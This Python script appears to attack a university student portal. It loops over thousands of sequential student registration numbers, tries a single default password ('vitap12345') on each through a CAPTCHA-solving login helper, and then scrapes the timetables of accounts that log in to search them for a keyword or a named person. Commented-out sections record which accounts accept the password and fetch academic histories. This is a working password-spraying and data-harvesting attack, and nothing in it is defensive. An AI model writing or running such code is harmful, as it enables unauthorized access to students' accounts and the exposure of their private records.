import os 
from captcha_parse import generate_session , get_acadhistory ,get_timetable
import re

# for i in range(7000,8000):
#     file1  =  open("21BCE7XXX.txt" ,"a")
#     file1.write("21BCE"+str(i)+"\n")

# file1.close()

# Using readlines()


# file1 = open('21BCE7XXX.txt', 'r')
# file2 = open('21BCE7XXX.txt copy', 'a')

# Lines = file1.readlines()

# print(type(Lines))
'''
count = 0
for i in (f"21BEC{x}" for x in range(7000,7800)):
    # i =  i[:9]
    a =  str(generate_session(i,"vitap12345"))[55:56]
    if(a=="T"):
        b = i+" "+a
        print(b)
        # file2.write(b+"\n")
        count=  count +1

print(count)
'''
# file1.close()
# file2.close()

# sess, valid = generate_session("21BCE9092", "vitap12345")

# acadHistory, check_grades = get_acadhistory(sess,"21BCE9092")

# days, check_timetable = get_timetable(sess, "21BCE9092")
# print((get_timetable(sess, "21BCE9092")))
# print((acadHistory))

# days = get_timetable(sess, "21BCE9092")

# print(type(days))

# find a word in a string using findall


# print(re.findall("Sandipan Maiti", days))
# if(re.findall("Sandipan Maiti", days)):
#     print("True")

# file2 = open("timetable.html", "w")

# file2.write(days)
# file2.close()
K = input("Enter keyword:  ")
print("afzal")
for i in (f"22BCE{x}" for x in range(7000,9999)):
    # i =  i[:9]
    sess, valid = generate_session(i, "vitap12345")
    days = get_timetable(sess, i)
    if(re.findall(K, days) ):

            print(i + " True")
